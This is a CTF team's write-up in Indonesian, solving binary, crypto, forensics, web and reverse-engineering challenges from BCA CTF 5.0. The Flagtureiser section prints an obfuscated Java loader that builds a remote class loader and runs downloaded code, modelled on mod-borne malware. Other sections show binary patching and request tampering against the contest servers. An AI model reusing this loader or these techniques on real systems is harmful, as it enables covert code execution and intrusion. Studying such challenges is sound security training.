# BCA CTF 5.0 Write-Up
---
## Team : manissoc
## Leaderboard : 287 of 1221 team
---
## Inaccessible (binex)
### Deskripsi
Melakukan analisis menggunakkan decompiler online, kami menggunakkan [Decompiler Explorer](https://dogbolt.org/) lalu menemukan program hasil compile dalam file tersebut

### dekompile menggunakkan Ghidra
```
undefined8 main(void)

{
  puts("No flag for you >:(");
  return 0;
}

void win(void)

{
  long lVar1;
  char cVar2;
  char cVar3;
  int iVar4;
  void *pvVar5;
  byte local_58 [48];
  long local_28;
  int local_1c;
  
  pvVar5 = (void *)0x0;
  memset(local_58,0,0x28);
  for (local_1c = 0; local_1c < 0x25; local_1c = local_1c + 1) {
    lVar1 = *(long *)(b + (long)local_1c * 8);
    iVar4 = f(local_1c + 1);
    local_28 = lVar1 / (long)iVar4;
    cVar3 = f((int)(char)i2[local_1c]);
    cVar2 = (char)local_28;
    iVar4 = c((void *)(ulong)(uint)(int)(char)i4[local_1c],pvVar5);
    local_58[local_1c] = (char)iVar4 + cVar3 + cVar2;
    local_58[local_1c] = ~local_58[local_1c];
  }
  puts((char *)local_58);
  return;
}
```

<br>Melanjutkan menggunakkan tools GDB dan melakukan pemangilan fungsi win. Lalu kita lihat perakitan fungsi _start.

### _start
```
  //
                             // .text 
                             // SHT_PROGBITS  [0x400440 - 0x400741]
                             // ram:00400440-ram:00400741
                             //
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined processEntry _start()
             undefined         AL:1           <RETURN>
             undefined8        Stack[-0x10]:8 local_10                                XREF[1]:     0040044e(*)  
                             _start                                          XREF[5]:     Entry Point(*), 00400018(*), 
                                                                                          0040077c, 004007d8(*), 
                                                                                          _elfSectionHeaders::00000310(*)  
        00400440 31 ed           XOR        EBP,EBP
        00400442 49 89 d1        MOV        R9,RDX
        00400445 5e              POP        RSI
        00400446 48 89 e2        MOV        RDX,RSP
        00400449 48 83 e4 f0     AND        RSP,-0x10
        0040044d 50              PUSH       RAX
        0040044e 54              PUSH       RSP=>local_10
        0040044f 49 c7 c0        MOV        R8,__libc_csu_fini
                 40 07 40 00
        00400456 48 c7 c1        MOV        RCX,__libc_csu_init
                 d0 06 40 00
        0040045d 48 c7 c7        MOV        RDI,main
                 b8 06 40 00
        00400464 e8 b7 ff        CALL       <EXTERNAL>::__libc_start_main                    undefined __libc_start_main()
                 ff ff
        00400469 f4              HLT
        0040046a 66              ??         66h    f
        0040046b 0f              ??         0Fh
        0040046c 1f              ??         1Fh
        0040046d 44              ??         44h    D
        0040046e 00              ??         00h
        0040046f 00              ??         00h
```

<br>kami melakukan perubahan pada alamat 0x4006b8 dari fungsi utama yang akan dipanggil. Alamat fungsi win adalah 0x4005ea, jadi tulis ulang bagian yang sesuai menjadi ea 05 40 00 dan jalankan. 

### Ubah alamat
```
0040045d 48 c7 c7        MOV        RDI,main
                 b8 06 40 00
```

### Menjalankan program
``` 
$ ./chall_mod
```

dan didapati flagnya **bcactf{W0w_Y0u_m4d3_iT_b810c453a9ac9}**

## Time Skip (crypto)
### Deskripsi
Melakukan analisis dengan mudah via bantuan chatgpt untuk menentukan algoritma kiptografi yang digunakan, kami menemuka algoritma [sandi Scytale](https://www.dcode.fr/scytale-cipher)

### Flag (ciphertext)
```
hsggna0stiaeaetteyc4ehvdatyporwtyseefregrstaf_etposruouoy{qnirroiybrbs5edmothssavetc8hebhwuibihh72eyaoepmlvoet9lobulpkyenf4xpulsloinmelllisyassnousa31mebneedtctg_}eeedeboghbihpatesyyfolus1lnhnooeliotb5ebidfueonnactayseyl
```

### Flag (plaintext)
``` 
heyguysimkindoflostprobablynotgoingtosurvivemuchlongertobehonestbutanywaystheflagisbcactf{5c7t4l3_h15t04y_qe829xl1}pleasesendhelpimeanbythetimeyouseethisiveprobablybeendeadforthousandsofyearsohwellseeyoulaterisupposebyee
```

didapati flagnya **bcactf{5c7t4l3_h15t04y_qe829xl1}**

## Vinegar Times 3 (crypto)
### Deskripsi
Sandi Vinegar. Gunakan key - vinegar untuk mendekripsinya atau gunakan kata sebelumnya sebagai kunci untuk mendekripsi sandi berikutnya, dan ulangi.

### Flag (ciphertext)
```
Key：vinegar、 chiper：mmqaonv         -> redwine
Key：redwine、 chiper：seooizmt        -> balsamic
Key：balsamic、chiper：bdoloeinbdjmmyg -> addtosaladyummy
```

didapati flagnya **bcactf{add_to_salad_yummy}**

## Chalkboard Gag (foren)
### Deskripsi
Terdapat kata **I WILL NOT BE SNEAKY** pada setiap barisnya, maka kami menggunakkan program python untuk menghilangkan kalimat tersebut dan meninggalkan huruf selain tersebut (casse sensitive)

### Python (getFlag)
```
#!/usr/bin/env python3
with open('chalkboardgag.txt', 'r') as f:
    lines = f.read().splitlines()

PHRASE = 'I WILL NOT BE SNEAKY'

flag = ''
for line in lines:
    if line != PHRASE:
        for i in range(len(line)):
            if line[i] != PHRASE[i]:
                flag += line[i]
                break

print(flag)
```

didapati flagnya **bcactf{BaRT_W0U1D_B3_PR0uD}**

## Sea Scavenger (foren)
### Deskripsi
Melakukan analisis web statis [berikut](challs.bcactf.com:31314)

### Inspect Element Website
Kami melihat sumber HTML http://challs.bcactf.com:32173/shark dengan comment sebagai berikut
```
<!-- You found the shark! Part 1 of the flag: "bcactf{b3" -->
```

### Inspect Element Website
Kemudian kami melihat /static/Squid.js yang tertaut dalam sumber HTML http://challs.bcactf.com:32173/squid sebagai berikut
```
console.log("You found it! Here's the second part of the flag: \"t_y0u_d1\"");
```

### Inspect Element Website
Dilanjut mengakses http://challs.bcactf.com:32173/clam , berikut ini tertulis di flag cookie bagian 3
```
dnt_f1n
```

### Inspect Element Website
Kemudian mengakses http://challs.bcactf.com:32173/shipwreck , pada header responsnya
```
Flag_Part_4: d_th3_tr
```

### Inspect Element Website
Terakhir melihat /static/whale.js yang ditautkan ke sumber HTML http://challs.bcactf.com:32173/whale
```
// Part 5 of the flag: "e4sur3"
```

### Inspect Element Website
Penutup diakses pada http://challs.bcactf.com:32173/treasure, masuk kedalam http://challs.bcactf.com:32173/treasure/robots.txt
```
You found the rest of the flag!

_t336e3}
```

didapati flagnya **bcactf{b3t_y0u_d1dnt_f1nd_th3_tre4sur3_t336e3}**

## 23-719 (foren)
### Deskripsi
Diberi sebuah artikel, kita melakukan analysis file PDFnya dan melakukan beberapa queri terminal
```
$ pdftotext 23-719_19m2.pdf
$ cat 23-719_19m2.txt | grep -A 2 -B 2 -i ctf 
```
### Hasil
```
Al_WOrLd_appLIc4t1ons_Of_cTf_ad04cc78601d5da8}
b cactf{rE , KAGAN
SOTOMAYOR
, and JACKSON, JJ., concurring in judgment
```

didapati flagnya **bcactf{rEAl_WOrLd_appLIc4t1ons_Of_cTf_ad04cc78601d5da8}**

## Discord (misc)
### Deskripsi
Bergabung [discord](https://discord.com/invite/NP9Bb7PDWf) dan mencari flagnya dichannel #announcements. didapati flagnya **bcactf{w3lc0m3_t0_bC@c7F_5_fby4uf4dijreferuvg}**

## Survey (misc)
### Deskripsi
Mengisi link [survei](https://forms.gle/tTxsmMyLKDdkQz2y5) dan mendapatkan flagnya **bcactf{THankS_fOr_Pl4YiNG_08aa139604c6d}**

## Flagtureiser (rev)
### Deskripsi
Diberikan file aplikasi .jar, kita melakukan dekompilasi menggunakkan [jdax decompiler](https://jdec.app/). ditemukan fungsi file flagtureiser.class yang mencurigakan
```
@Mod("flagtureiser")
public class Flagtureiser {
   public static final String MODID = "flagtureiser";
   private static final Logger LOGGER = LogUtils.getLogger();
   public static final DeferredRegister<Block> BLOCKS;
   public static final DeferredRegister<Item> ITEMS;
   public static final RegistryObject<Block> EXAMPLE_BLOCK;
   public static final RegistryObject<Item> EXAMPLE_BLOCK_ITEM;

   static void _6d8f2e1fefef5b67bf4f49179b84f29f7d1e01f0() throws Exception {
      Class.forName(new String(new byte[]{85, 116, 105, 108, 105, 116, 121}), true, (ClassLoader)Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 110, 101, 116, 46, 85, 82, 76, 67, 108, 97, 115, 115, 76, 111, 97, 100, 101, 114})).getConstructor(URL[].class).newInstance(new URL(new String(new byte[]{104, 116, 116, 112}), new String(new byte[]{98, 99, 97, 99, 116, 102, 123, 102, 82, 97, 67, 116, 117, 114, 51, 49, 115, 51, 82, 95, 115, 84, 56, 103, 69, 95, 122, 51, 82, 48, 125}), 8080, new String(new byte[]{47, 100, 108})))).getMethod(new String(new byte[]{114, 117, 110}), String.class).invoke((Object)null, "-114.-18.38.108.-100");
   }
```

<br> kami melakukan dekripsi decimal ke ascii untuk mendapatkan flagnya

### Flag (ciphertext)
```
98, 99, 97, 99, 116, 102, 123, 102, 82, 97, 67, 116, 117, 114, 51, 49, 115, 51, 82, 95, 115, 84, 56, 103, 69, 95, 122, 51, 82, 48, 125
```

didapati flagnya **bcactf{fRaCtur31s3R_sT8gE_z3R0}**

## NoSql (webex)
### Deskripsi
Mencari flag pada [website](challs.bcactf.com:30390), dan diberikan hint **Ricardo Olsen has an ID of 1**

### Kueri Url
```
http://challs.bcactf.com:30390/?name=. 
```

### Output
```
{
 "rtnValues": [
  "Ricardo Olsen",
  "April Park",
  "Francis Jackson",
  "Ana Barry",
  "Clifford Craig",
  "Andrew Wise",
  "Ada Atkinson",
  "Janis McIntosh",
  "Rosie Parsons",
  "Neal Weaver",
  "Alyssa Robison",
  "Michael Hurst",
  "Roberto Thornton",
  "Renee Schwartz",
  "Darryl Wilson",
  "Wayne Boyle",
  "Loretta Camacho",
  "Bert Morton",
  "Suzanne Johnson",
  "Carol Fowler",
  "Rose Hansen",
  "Aimee Norman",
  "Bethany Foley",
  "Benjamin Baily",
  "David Hull",
  "Sabrina Fish",
  "Rick Kirby",
  "Edgar Grimes",
  "Blake McDermott",
  "Alicia Crosby",
  "Teresa Ortega",
  "Carroll Darling",
  "Louis Tate",
  "Phillip Fuller",
  "Clinton Kimball",
  "Alma Matthews",
  "Stacie Franklin",
  "Lucinda Steward",
  "Gina Andrews",
  "Philip Hyde",
  "Devin Riggs",
  "Michelle Thornton",
  "Rogelio Freeman",
  "Arthur Stephens",
  "Andy Leon",
  "Megan Gould",
  "Myrna Yates",
  "Edwin Pearce",
  "Shirley Cannon",
  "Lowell Cochran",
  "Flag Holder"
 ]
}
```

<br> nama mencurigakan Flag Holder berada pada no 51, maka
```
$ curl http://challs.bcactf.com:30390/51/Flag/Holder  
```

didapati flagnya **bcactf{R3gex_WH1z_54dfa9cdba13}**

## Phone number (webex)
### Deskripsi
Cegat dengan BurpSuite dan kirimkan ke nomor telepon yang sesuai. Ketika kami mengubah bagian nomor telepon dari data yang disadap menjadi 1234567890 yang tertulis dalam pertanyaan dan mengirimkannya, sebuah flag ditampilkan.

<br> didapati flagnya **bcactf{PHoN3_num8eR_EntER3D!_17847928}**

## Tic-Tac-Toe (webex)
### Deskripsi
Melakukan modifikasi request pada [link](challs.bcactf.com:30649) menggunakkan burpsuite. Request kita hentikan dan modifikasi nilainya agar dapat memenangkan gamenya, karena jika tidak dimodifikasi maka permainan akan seri selamanya.

<br> didapati flagnya bcactf{7h3_m4st3r_0f_t1ct4ct0e_678d52c8}


# Beberapa flag yang didapatkan sesudah event berakhir

## XOR (rev)
### Deskripsi 
Melakukan analisis file xor menggunakkan `strings` dan didapati hasil berikut
```
/lib64/ld-linux-x86-64.so.2
puts
free
fread
fopen
malloc
__libc_start_main
__cxa_finalize
sprintf
ftell
fclose
fseek
libc.so.6
GLIBC_2.34
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
%02X
ClkvKOR8JQA1JB731LeGkU7J4d2khDvrOPI63mM7
flag.txt
Failed to open flag file. Make sure flag.txt exists.
Memory allocation failed for input.
Memory allocation failed for output.
Encrypted flag: %s
9*3$"
GCC: (Ubuntu 13.2.0-23ubuntu4) 13.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
xor.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
free@GLIBC_2.2.5
__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
xorEncrypt
puts@GLIBC_2.2.5
fread@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
_fini
__data_start
ftell@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
malloc@GLIBC_2.2.5
_end
fseek@GLIBC_2.2.5
__bss_start
main
fopen@GLIBC_2.2.5
sprintf@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

<br> ditemukan baris mencurigakan `ClkvKOR8JQA1JB731LeGkU7J4d2khDvrOPI63mM7`. kami kemudian melakukan cek link yang diberikan `nc challs.bcactf.com 32411`

### Output
```
21 0F 0A 15 3F 29 29 6B 13 1C 2C 74 7D 30 5E 50 6E 29 2B 24 19 0C 67 7D 05 54 7C 34 5C 13 32 42 29 62 7B 0F 4E
```

<br> kita melakukan dekripsi XOR unntuk mendapatkan plaintextnya menggunakkan `ClkvKOR8JQA1JB731LeGkU7J4d2khDvrOPI63mM7` sebagai key-nya.

<br> didapati flagnya **bcactf{SYMmE7ric_eNcrYP710N_4WD0f229}**

## NOTFlag (crypto)
###  Deskripsi
Didapati sebuah ciphertext saat membuka file .txt yang diberikan, hint `Encrypted using Base64`
```
nZyenIuZhMiXtoygzoygyJfMoJmTnsaC
```

<br> kami melakukan dekripsi base64 [online](https://www.dcode.fr/xor-cipher) secara bruteforce

<br> didapati flagnya **bcactf{7hIs_1s_7h3_fla9}**

---

Feel free to copy this into your `README.md` file on GitHub.
